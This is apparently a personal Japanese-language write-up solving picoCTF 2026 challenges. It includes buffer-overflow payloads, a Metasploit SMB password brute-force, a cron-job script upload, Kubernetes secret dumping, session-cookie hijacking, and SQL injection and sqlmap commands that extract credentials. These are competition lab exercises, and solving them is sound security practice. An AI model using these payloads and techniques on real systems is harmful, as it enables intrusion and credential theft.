# picoCTF 2026 - ほぼ writeup

## offset-cycle

printf "%42c%12c\xf6\x91\x04\x08" "@" "@" | ./2
こういうやつでパパっとやる
win のアドレスは固定
42 は BUFSIZE

## offset-cycle-v2

```plain
./start

# ファイル名
N = 36

# win のアドレス: 08049316 (一応確認)
# BUFSIZE を確認
nm $N | grep "win"; \cat ./$N.c | grep "define BUF"

# 159 の部分を BUFSIZE にする
python3 -c 's = b"0" * 159 + b"pico" + b"0" * 16 + b"\x16\x93"; __import__("sys").stdout.buffer.write(str(len(s)).encode() + b"\n" + s)' | ./$N
```

## bytemancy 2

printf "\xff\xff\xff\n" | nc ...

## Printer shares 2

//shares/notification.txt を見ると Joe のユーザーがデフォっぽい

```plain
$ nix run nixpkgs\#metasploit

msf > use auxiliary/scanner/smb/smb_login
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session

msf auxiliary(scanner/smb/smb_login) > set USER_FILE /home/syoch/ghq/github.com/syoch/CTF/problems/picoctf2026/user

msf auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/syoch/ghq/github.com/syoch/CTF/problems/picoctf2026/rockyou.txt

msf auxiliary(scanner/smb/smb_login) > set RHOSTS green-hill.picoctf.net
msf auxiliary(scanner/smb/smb_login) > set RPORT 58237
msf auxiliary(scanner/smb/smb_login) > run

(snip)

.\joe:popcorn
```

```plain
$ smbclient-ng --host green-hill.picoctf.net --debug --port 58237 -u joe -p popcorn
use secure-shares
cat flag.txt

```

## Printer shares 3

```plain
$ cat script.sh
#!/bin/bash

cat /challenge/secure-shares/flag.txt
```

```plain
$ smbclient-ng --host green-hill.picoctf.net --debug --port 58237 -u ctf -p ctf
use shares
put script.sh
(わりとまつ)
cat cron.log
```

## Auto rev 1

ELF のバイナリを喋る前に数字を喋ってくる。
この数字を一瞬でコピペすると通るのでこれをいっぱい繰り返す。

ELF のサイズは固定なので全画面 + 折り返しありでやると楽

## Forensics Git2

3 番目のパーティションの /home/ctf-player/Code/killer-chat-app に git リポがある。
.git/objects からオブジェクト一覧を出して、手当たり次第 `git cat-file -p <object>` をする。
どっかに picoCTF{...} がある。

## Forensics Git 1

p3 の /home/ctf-player/Code/secrets に git リポがある。
そこに cd してこう

```shell
for f in .git/objects/*/*; do echo $f | cut -c 14- | tr -d / | xargs git cat-file -p; done | grep picoCTF
```

## Forensics Git 0

p3 の /home/ctf-player/Code/secrets に git リポがある。
そこに cd してこう

```shell
$ for f in .git/objects/*/*; do echo $f | cut -c 14- | tr -d / | xargs git cat-file -p; done
100644 blob 46064ac3ab7afd9a95bc1224aa8b4cef23741fcc    note.txt
tree 186ca660f488a4e4cdd92e7678fcfa3da478aee7
author ctf-player <ctf-player@example.com> 1763542167 +0000
committer ctf-player <ctf-player@example.com> 1763542167 +0000

Wrap this phrase in the flag format: g17_1n_7h3_d15k_041217d8
The picoCTF flag format is 'picoCTF{}' where there is some leetspeak phrase in between the curly braces
```

よって `picoCTF{g17_1n_7h3_d15k_041217d8}`

## KSECRETS

`kubectl --insecure-skip-tls-verify=true --kubeconfig ./kubeconfig.yaml get namespaces`
(picoctf って名前の名前空間あるな〜)

`kubectl --insecure-skip-tls-verify=true --kubeconfig ./kubeconfig.yaml get secrets -n picoctf`
(ctf-secret っていうシークレットあるな〜)

`kubectl --insecure-skip-tls-verify=true --kubeconfig ./kubeconfig.yaml get secrets ctf-secret -n picoctf -o jsonpath='{.data}' | jq -r '.data' | base64 -d`
(フラグだな〜)

## North-South

nginx.conf の L27
`if ($geoip2_data_country_code = IS) {`
→ アイスランド

Chromium ベースの任意のブラウザーをインストール (FireFox の拡張のダウンロードをしようとすると .exe がダウンロードされてちょっと怖い)
Urban VPN をインストール
VPN を Iceland 指定で接続する
提示されたサイトに Chromium でアクセスする

## チャットみたいなやつ

雑なアカウントを作ってログインする
mary_jones_8992 が /sessions とかいう激アツエンドポイントを喋ってる
→アクセスすると admin のセッション ID がとれる
Cookie を admin のセッション ID に書き換えてアクセスする

## Secret Box

```plain
' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb' LIMIT 1) || '
```

## Sql Map1

nix run nixpkgs\#sqlmap -- -u "http://lonely-island.picoctf.net:53938/vuln.php?q=p" --cookie="PHPSESSID=d2dee3decb973038126418cbcc25e10b" -p q --threads 10 -T users --batch --dump
で dyesebel を得る
ctf-player:dyesebel でログインすれば OK

## ORDER ORDER

レポート作成時にユーザー名で SQLi ができる
`' UNION SELECT name, name, sql FROM sqlite_master WHERE type='table'-- `
(テーブルの調査)

`' UNION SELECT name, value, value FROM aDNyM19uMF9mMTRn UNION SELECT username, email, password FROM users-- `
(それらしいテーブルからデータを抜く)

##